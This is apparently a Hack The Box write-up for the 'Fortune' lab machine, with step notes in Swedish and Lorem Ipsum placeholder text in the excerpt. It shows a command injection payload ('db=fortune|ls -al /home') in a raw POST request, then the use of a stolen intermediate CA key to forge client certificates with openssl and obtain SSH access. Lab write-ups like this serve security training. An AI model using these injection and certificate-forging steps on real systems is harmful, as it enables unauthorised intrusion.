---
layout: single
title: Fortune - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-06-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-fortune/fortune_logo.png
  teaser_home_page: true
  icon: /assets/images/question-mark-white.png
categories:
  - hackthebox
  - infosec
tags:  
  - unknown os
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-fortune/fortune_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


### USER ###

1. Basic enum shows port 22,80,443. 443 har cert error, 80 anropar en db med fortunes, 22 saknar vi creds för

2. dirb visar inget spännande. Kör en crawl/audit i burp på http://10.10.10.127 och ser att den är vulnerable för os command- och code injection.

3. Skickar POST Request till Repeater och söker mig runt i burken efter cert filer och användare:
POST /select HTTP/1.1
Host: 10.10.10.127
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Connection: close
Cache-Control: max-age=0
Referer: http://10.10.10.127/
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

db=fortune|ls -al /home

4. Hittar 3 användare: bob, charlie och nfsuser. Bob har massor av cert-filer vilket känns intressant. Charlie kommer man ej åt så chansar att user.txt finns här. nfsuser har en mer eller mindre tom hemkatalog

5. Plockar hem alla filer från bob så jag har följade filstruktur:
#tree
.
├── bob
│   ├── ca
│   │   ├── certs
│   │   │   └── ca.cert.pem
│   │   ├── index.txt
│   │   ├── index.txt.attr
│   │   ├── intermediate
│   │   │   ├── certs
│   │   │   │   ├── ca-chain.cert.pem
│   │   │   │   ├── fortune.htb.cert.pem
│   │   │   │   ├── intermediate.cert.pem
│   │   │   │   └── intermediate.cert.srl
│   │   │   ├── crlnumber
│   │   │   ├── csr
│   │   │   │   ├── fortune.htb.csr.pem
│   │   │   │   └── intermediate.csr.pem
│   │   │   ├── index.txt
│   │   │   ├── newcerts
│   │   │   │   └── 1000.pem
│   │   │   ├── openssl.cnf
│   │   │   └── private
│   │   │       └── intermediate.key.pem
│   │   ├── newcerts
│   │   │   └── 1000.pem
│   │   ├── openssl.cnf
│   │   ├── serial
│   │   └── serial.old
│   └── dba
│       └── authpf.sql

6. För enkelhet skapa en dir som heter custom-certs utanför dir bob. Skapa custom cert-key samt request för bob och charlie (subj-info tagen från bob/ca/index.txt samt bob/ca/intermediate/index.txt) i nyskapade custom-cert dir'en:
openssl req -newkey rsa:4096 -keyout bob_key.pem -out bob_csr.pem -nodes -days 365 -subj "/C=CA/ST=ON/O=Fortune Co HTB/CN=Fortune Intermediate CA/emailAddress=bob@fortune.htb"

openssl req -newkey rsa:4096 -keyout charlie_key.pem -out charlie_csr.pem -nodes -days 365 -subj "/C=CA/ST=ON/O=Fortune Co HTB/CN=fortune.htb/emailAddress=charlie@fortune.htb"

7. Döp om filerna för enkelhetensskull:
mv bob_key.pem bob.key && mv bob_csr.pem bob.csr
mv charlie_key.pem charlie.key && mv charlie_csr.pem charlie.csr

#ls -al
total 24
drwxr-xr-x 1 root root  108 Jun 26 14:25 .
drwxr-xr-x 1 root root  196 Jun 26 14:10 ..
-rw-r--r-- 1 root root 1716 Jun 26 14:11 bob.csr
-rw------- 1 root root 3272 Jun 26 14:11 bob.key
-rw-r--r-- 1 root root 1704 Jun 26 14:12 charlie.csr
-rw------- 1 root root 3272 Jun 26 14:12 charlie.key

8. Signera certificate requests med intermediate.key (pwd = htb/machines/fortune/custom-certs):
openssl x509 -req -days 365 -in bob.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out bob.crt

openssl x509 -req -days 365 -in charlie.csr -CA ../bob/ca/intermediate/certs/intermediate.cert.pem -CAkey ../bob/ca/intermediate/private/intermediate.key.pem -CAcreateserial -out charlie.crt

9. Konvertera .crt till .p12 för att kunna använda dem i Firefox, lämna password blankt (pwd = htb/machines/fortune/custom-certs):
openssl pkcs12 -export -out bob.p12 -inkey bob.key -in bob.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem
openssl pkcs12 -export -out charlie.p12 -inkey charlie.key -in charlie.crt -certfile ../bob/ca/intermediate/certs/intermediate.cert.pem

10. Importera charlie.p12 i Firefox och surfa in på https://10.10.10.127 för att få SSH key pair
options -> preferences -> advanced -> certificates -> view certificates -> your certificates -> import -> select charlie.p12 -> ok

11. Tryck på "generate" och spara ner public key i /root/.ssh/id_rsa.pub (perm 644) samt private i /root/.ssh/id_rsa (perm 600)

12. Logga in som nfsuser med public key.
    ssh nfsuser@10.10.10.127

